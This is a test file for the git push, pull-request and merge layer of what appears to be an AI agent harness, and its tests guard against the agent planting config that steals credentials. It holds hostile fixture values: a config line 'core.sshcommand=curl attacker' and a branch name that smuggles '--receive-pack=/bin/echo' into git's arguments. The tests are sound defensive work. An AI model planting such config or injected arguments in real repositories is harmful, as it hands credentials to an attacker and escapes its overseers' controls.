import { describe, it, expect, vi } from "vitest";
import { createDelivery } from "./delivery.js";
import { CommandResult } from "./exec.js";
import { ClaimedTask } from "./types.js";
import { claimedTask } from "./__fixtures__/task.js";

const task = claimedTask();

const ok: CommandResult = { code: 0, stdout: "", stderr: "", timedOut: false };

// The refuseIfPlanted pre-flight goes through git-safety, which prepends "-c key=value" pairs.
// Delivery's own calls carry none — their hardening is in the environment — so this only ever
// strips the pre-flight's.
function withoutConfigFlags(args: string[]): string[] {
  const rest = [...args];
  while (rest[0] === "-c") rest.splice(0, 2);
  return rest;
}

function fakeCli(responses: Record<string, Partial<CommandResult>>) {
  const run = vi.fn(async (command: string, args: string[]): Promise<CommandResult> => {
    const line = `${command} ${withoutConfigFlags(args).join(" ")}`;
    const key = Object.keys(responses).find((prefix) => line.startsWith(prefix));
    return { ...ok, ...(key ? responses[key] : {}) };
  });
  return { runner: { run }, run };
}

// push begins with a `git config --local --list` pre-flight (see refuseIfPlanted), which runs
// through git-safety rather than delivery's own hardening and is not the call any of these
// assertions is about.
function deliveryCalls(run: ReturnType<typeof vi.fn>): unknown[][] {
  return run.mock.calls.filter(
    ([, args]) => !withoutConfigFlags(args as string[]).join(" ").startsWith("config --local")
  );
}

function argsOf(run: ReturnType<typeof vi.fn>, index = 0): string[] {
  return deliveryCalls(run)[index][1] as string[];
}

function envOf(run: ReturnType<typeof vi.fn>, index = 0): Record<string, string> {
  return (deliveryCalls(run)[index][2] as { env: Record<string, string> }).env;
}

// git reads GIT_CONFIG_KEY_n / GIT_CONFIG_VALUE_n as ordered pairs, so the assertions read them
// back the same way rather than asserting on the numbering
function configuredBy(env: Record<string, string | undefined>): [string, string][] {
  const count = Number(env.GIT_CONFIG_COUNT ?? 0);
  return Array.from({ length: count }, (_, i) => [
    env[`GIT_CONFIG_KEY_${i}`] ?? "",
    env[`GIT_CONFIG_VALUE_${i}`] ?? "",
  ]);
}

function valueOf(args: string[], flag: string): string {
  return args[args.indexOf(flag) + 1];
}

describe("push", () => {
  it("pushes the branch upstream", async () => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "cp-158/worker");

    expect(run).toHaveBeenCalledWith(
      "git",
      [
        "push",
        "--no-verify",
        "--receive-pack=git-receive-pack",
        "--force-with-lease",
        "-u",
        "origin",
        "--",
        "cp-158/worker",
      ],
      expect.objectContaining({ cwd: "/wt" })
    );
  });

  it("replaces the branch a previous attempt pushed, under a lease rather than a blind force", async () => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "cp-158/worker");

    const args = argsOf(run);
    expect(args).toContain("--force-with-lease");
    expect(args).not.toContain("--force");
  });

  it("throws when the push is rejected", async () => {
    const { runner } = fakeCli({ "git push": { code: 1, stderr: "! [rejected] (non-fast-forward)" } });
    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(
      /non-fast-forward/
    );
  });

  it("names the timeout instead of throwing an empty error when the push hangs", async () => {
    const { runner } = fakeCli({ "git push": { code: -1, timedOut: true } });
    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(/timed out/);
  });

  // bindRepository scanned this config before the agent ever saw the checkout, and the agent holds
  // Write; push is the call that hands whatever it planted a credential
  it("refuses to push when the agent planted an executable key in the checkout's config", async () => {
    const { runner } = fakeCli({
      "git config --local --list": { stdout: "core.sshcommand=curl attacker\n" },
    });
    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(
      /core\.sshcommand/
    );
  });

  it("does not push when the config cannot be read at all", async () => {
    const { runner, run } = fakeCli({ "git config --local --list": { code: 128 } });
    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(/refusing/);
    expect(run.mock.calls.some(([, args]) => (args as string[]).includes("push"))).toBe(false);
  });

  // What the repository config can still make git execute on our behalf. That the flags are spelled
  // correctly is all a mocked runner can show — delivery.hooks.integration.test.ts proves the effect
  // against a real git and a really planted hook.
  it("neutralises every config file git would otherwise read", async () => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "cp-158/worker");

    const env = envOf(run);
    expect(env.GIT_CONFIG_NOSYSTEM).toBe("1");
    expect(env.GIT_CONFIG_GLOBAL).toBe("/dev/null");
  });

  it.each([
    ["core.hooksPath", "/dev/null"],
    ["core.sshCommand", "ssh"],
    ["core.askPass", ""],
    ["core.fsmonitor", "false"],
    ["core.pager", "cat"],
  ])("overrides %s, which the repository config could otherwise point at a program", async (key, value) => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "cp-158/worker");

    expect(configuredBy(envOf(run))).toContainEqual([key, value]);
  });

  // The transport is where the credentials actually leaked: ext:: hands the URL to a program, and
  // a local push runs git-receive-pack as our own child, whose post-receive hook then holds them
  it.each([
    ["protocol.ext.allow", "never"],
    ["protocol.file.allow", "never"],
  ])("refuses the %s transport, whichever way the remote url was rewritten", async (key, value) => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "cp-158/worker");

    expect(configuredBy(envOf(run))).toContainEqual([key, value]);
  });

  // Also not in the config list, and for the same reason one layer along: git keeps the first
  // gitProxy entry it finds, so the repository's wins over any override the list could carry.
  // The environment is where it is won, and empty there means no proxy rather than fall through.
  it("empties the proxy command in the environment, where config cannot outrank it", async () => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "cp-158/worker");

    const env = envOf(run);
    expect(env.GIT_PROXY_COMMAND).toBe("");
    expect(configuredBy(env).map(([key]) => key)).not.toContain("core.gitProxy");
  });

  // Not in the config list on purpose: git keeps the first receivepack it is given, so a repository
  // setting outranks any override and only the command line wins
  it("names the receive-pack on the command line, where config cannot outrank it", async () => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "cp-158/worker");

    expect(argsOf(run)).toContain("--receive-pack=git-receive-pack");
    expect(configuredBy(envOf(run)).map(([key]) => key)).not.toContain("remote.origin.receivepack");
  });

  // Clearing the helper list is what makes GIT_CONFIG_GLOBAL safe to set; naming ours after it is
  // what keeps an https remote authenticating once the global file is gone
  it("clears inherited credential helpers and names the one it trusts, in that order", async () => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "cp-158/worker");

    const helpers = configuredBy(envOf(run)).filter(([key]) => key === "credential.helper");
    expect(helpers).toEqual([
      ["credential.helper", ""],
      ["credential.helper", "!gh auth git-credential"],
    ]);
  });

  // gh does not take -c, and shells out to git itself, so the hardening has to travel in the
  // environment or those inner invocations run unprotected
  it("hands gh the same hardening as git", async () => {
    const { runner, run } = fakeCli({
      "gh pr create": { stdout: "https://github.com/o/r/pull/1\n" },
    });
    await createDelivery(runner).openPr("/wt", task, "summary");

    const ghCall = run.mock.calls.find((call) => call[0] === "gh");
    const env = (ghCall?.[2] as { env: Record<string, string> }).env;
    expect(env.GIT_CONFIG_GLOBAL).toBe("/dev/null");
    expect(env.GIT_PROXY_COMMAND).toBe("");
    expect(configuredBy(env)).toContainEqual(["core.hooksPath", "/dev/null"]);
  });
});

describe("openPr", () => {
  // gh does not understand git's -c flag, so only git invocations may carry it
  it("returns the pr url from gh output", async () => {
    const run = vi
      .fn()
      .mockResolvedValue({ ...ok, stdout: "https://github.com/x/y/pull/7\n" });

    const url = await createDelivery({ run }).openPr("/wt", task, "did the thing");

    expect(url).toBe("https://github.com/x/y/pull/7");
    expect(argsOf(run)).toContain("--title");
  });

  it("prefixes the pr title with the task key", async () => {
    const run = vi.fn().mockResolvedValue({ ...ok, stdout: "https://github.com/x/y/pull/7" });
    await createDelivery({ run }).openPr("/wt", task, "summary");

    expect(valueOf(argsOf(run), "--title")).toBe("CP-158: Add a thing");
  });

  it("picks the pull request url out of noisy output", async () => {
    const run = vi.fn().mockResolvedValue({
      ...ok,
      stdout: [
        "remote: Create a pull request for 'cp-158/worker' on GitHub by visiting:",
        "remote:      https://github.com/x/y/pull/new/cp-158/worker",
        "https://github.com/x/y/pull/7",
        "",
      ].join("\n"),
    });

    const url = await createDelivery({ run }).openPr("/wt", task, "summary");
    expect(url).toBe("https://github.com/x/y/pull/7");
  });

  it("throws instead of returning output that is not a pull request url", async () => {
    const run = vi
      .fn()
      .mockResolvedValue({ ...ok, stdout: "Warning: 1 uncommitted change\n" });

    await expect(createDelivery({ run }).openPr("/wt", task, "summary")).rejects.toThrow(
      /no pull request url/
    );
  });

  it("reuses the pull request an earlier attempt already opened for the branch", async () => {
    const { runner } = fakeCli({
      "gh pr create": {
        code: 1,
        stderr:
          'a pull request for branch "cp-158/worker" into branch "main" already exists:\nhttps://github.com/x/y/pull/7\n',
      },
    });

    const url = await createDelivery(runner).openPr("/wt", task, "summary");
    expect(url).toBe("https://github.com/x/y/pull/7");
  });

  it("throws when the pull request cannot be created", async () => {
    const { runner } = fakeCli({
      "gh pr create": { code: 1, stderr: "gh: authentication required" },
    });
    await expect(createDelivery(runner).openPr("/wt", task, "summary")).rejects.toThrow(
      /authentication required/
    );
  });

  it("caps a runaway summary so the body cannot exceed the argument limit", async () => {
    const run = vi.fn().mockResolvedValue({ ...ok, stdout: "https://github.com/x/y/pull/7" });
    await createDelivery({ run }).openPr("/wt", task, "x".repeat(200_000));

    const body = valueOf(argsOf(run), "--body");
    expect(body.length).toBeLessThan(40_000);
    expect(body).toMatch(/truncated/);
  });

  it("targets the configured base branch", async () => {
    const run = vi.fn().mockResolvedValue({ ...ok, stdout: "https://github.com/x/y/pull/7" });
    await createDelivery({ run }, "develop").openPr("/wt", task, "summary");

    expect(valueOf(argsOf(run), "--base")).toBe("develop");
  });

  it("leaves the base to the repository default when none is configured", async () => {
    const run = vi.fn().mockResolvedValue({ ...ok, stdout: "https://github.com/x/y/pull/7" });
    await createDelivery({ run }).openPr("/wt", task, "summary");

    expect(argsOf(run)).not.toContain("--base");
  });

  it("keeps the pr title on a single line", async () => {
    const run = vi.fn().mockResolvedValue({ ...ok, stdout: "https://github.com/x/y/pull/7" });
    await createDelivery({ run }).openPr("/wt", { ...task, title: "Add\na  thing" }, "summary");

    expect(valueOf(argsOf(run), "--title")).toBe("CP-158: Add a thing");
  });
});

describe("merge", () => {
  it("throws when the merge fails", async () => {
    const run = vi
      .fn()
      .mockResolvedValue({ code: 1, stdout: "", stderr: "not mergeable", timedOut: false });
    await expect(createDelivery({ run }).merge("/wt", "https://x/pull/7")).rejects.toThrow(
      /not mergeable/
    );
  });

  it("merges and deletes the branch", async () => {
    const { runner, run } = fakeCli({});
    await createDelivery(runner).merge("/wt", "https://github.com/x/y/pull/7");

    const args = argsOf(run);
    expect(args.slice(0, 3)).toEqual(["pr", "merge", "https://github.com/x/y/pull/7"]);
    expect(args).toContain("--merge");
    expect(args).toContain("--delete-branch");
  });

  it("targets the pull request's own repository so gh leaves the worktree checkout alone", async () => {
    const { runner, run } = fakeCli({});
    await createDelivery(runner).merge("/wt", "https://github.com/x/y/pull/7");

    expect(valueOf(argsOf(run), "--repo")).toBe("x/y");
  });

  it("keeps the enterprise host in the repository argument", async () => {
    const { runner, run } = fakeCli({});
    await createDelivery(runner).merge("/wt", "https://ghe.example.com/x/y/pull/7");

    expect(valueOf(argsOf(run), "--repo")).toBe("ghe.example.com/x/y");
  });

  it("keeps a non-default port in the repository argument", async () => {
    const { runner, run } = fakeCli({});
    await createDelivery(runner).merge("/wt", "https://ghe.example.com:8443/x/y/pull/7");

    expect(valueOf(argsOf(run), "--repo")).toBe("ghe.example.com:8443/x/y");
  });

  it("leaves the repository to gh when the url is not a recognisable pull request url", async () => {
    const { runner, run } = fakeCli({});
    await createDelivery(runner).merge("/wt", "https://x/pull/7");

    expect(argsOf(run)).not.toContain("--repo");
  });

  it("reports a merge the pull request actually took, even when gh exits non-zero afterwards", async () => {
    const { runner } = fakeCli({
      "gh pr merge": {
        code: 1,
        stderr: "failed to delete local branch cp-158/worker: fatal: 'main' is already checked out",
      },
      "gh pr view": { stdout: '{"state":"MERGED"}' },
    });

    await expect(
      createDelivery(runner).merge("/wt", "https://github.com/x/y/pull/7")
    ).resolves.toBeUndefined();
  });

  it("surfaces a blocked merge with the gh output instead of an empty crash", async () => {
    const { runner } = fakeCli({
      "gh pr merge": {
        code: 1,
        stderr: "Pull request #7 is not mergeable: the base branch policy prohibits the merge.",
      },
      "gh pr view": { stdout: '{"state":"OPEN"}' },
    });

    const error = await createDelivery(runner)
      .merge("/wt", "https://github.com/x/y/pull/7")
      .then(() => new Error("merge resolved"))
      .catch((thrown: unknown) => thrown);

    expect(String(error)).toMatch(/gh pr merge failed \(exit 1\): .*base branch policy/s);
    expect(String(error)).not.toMatch(/could not be confirmed/);
  });

  it("says the state is unconfirmed when the check itself fails, rather than asserting a failure", async () => {
    const { runner } = fakeCli({
      "gh pr merge": { code: 1, stderr: "connection reset by peer" },
      "gh pr view": { code: 1, stderr: "gh: authentication token expired" },
    });

    await expect(
      createDelivery(runner).merge("/wt", "https://github.com/x/y/pull/7")
    ).rejects.toThrow(/merge state could not be confirmed/);
  });

  it("names the timeout when the merge hangs", async () => {
    const run = vi.fn().mockResolvedValue({ code: -1, stdout: "", stderr: "", timedOut: true });
    await expect(
      createDelivery({ run }).merge("/wt", "https://github.com/x/y/pull/7")
    ).rejects.toThrow(/timed out/);
  });
});

describe("push argument boundaries", () => {
  it("separates the branch from git's options with --", async () => {
    const run = vi.fn().mockResolvedValue(ok);
    await createDelivery({ run }).push("/wt", "--receive-pack=/bin/echo");

    const args = argsOf(run);
    expect(args).toContain("--");
    expect(args.indexOf("--")).toBeLessThan(args.indexOf("--receive-pack=/bin/echo"));
  });
});
